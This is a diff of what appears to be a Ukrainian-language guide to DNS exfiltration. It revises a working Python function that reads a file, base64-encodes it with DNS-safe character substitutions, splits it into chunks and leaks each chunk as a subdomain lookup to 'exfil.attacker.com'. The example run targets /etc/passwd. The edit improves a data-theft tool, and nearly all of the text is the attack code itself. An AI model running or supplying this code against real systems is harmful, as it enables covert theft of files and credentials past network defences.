@@ -178,21 +178,30 @@ import base64
 import socket
 import time
 
-def exfiltrate_dns(file_path, domain="exfil.attacker.com", delay=0.5):
+def sanitize_base64(b64str):
+    """
+    Робить base64-блок DNS-безпечним:
+    + → -, / → _, = → (опційно) ~ або прибрати
+    """
+    return b64str.replace('+', '-').replace('/', '_').replace('=', '')
+
+def exfiltrate_dns_base64(file_path, domain="exfil.attacker.com", delay=0.5):
     with open(file_path, "rb") as f:
         data = f.read()
 
-    # Кодування в base32 (для безпечного використання у DNS)
-    encoded = base64.b32encode(data).decode()
+    # Кодування в base64 → str
+    encoded = base64.b64encode(data).decode()
 
-    # Розбиваємо на шматки (DNS піддомен <= 63 символи)
-    chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
+    # Робимо DNS-безпечну версію
+    safe_encoded = sanitize_base64(encoded)
+
+    # Розбивка на chunks довжиною ≤ 50 символів
+    chunks = [safe_encoded[i:i+50] for i in range(0, len(safe_encoded), 50)]
 
     print(f"[+] Exfiltrating {len(chunks)} chunks via DNS to {domain}")
     for i, chunk in enumerate(chunks):
-        subdomain = f"{chunk.lower()}.{domain}"
+        subdomain = f"{chunk}.{domain}"
         try:
-            # Викликаємо DNS lookup (без очікування відповіді)
             socket.gethostbyname(subdomain)
         except:
             pass
@@ -200,7 +209,7 @@ def exfiltrate_dns(file_path, domain="exfil.attacker.com", delay=0.5):
         time.sleep(delay)
 
 if __name__ == "__main__":
-    exfiltrate_dns("/etc/passwd", domain="exfil.attacker.com")
+    exfiltrate_dns_base64("/etc/passwd", domain="exfil.attacker.com")
 ```
 
 ### 🔸 Просто слухати DNS-пакети:
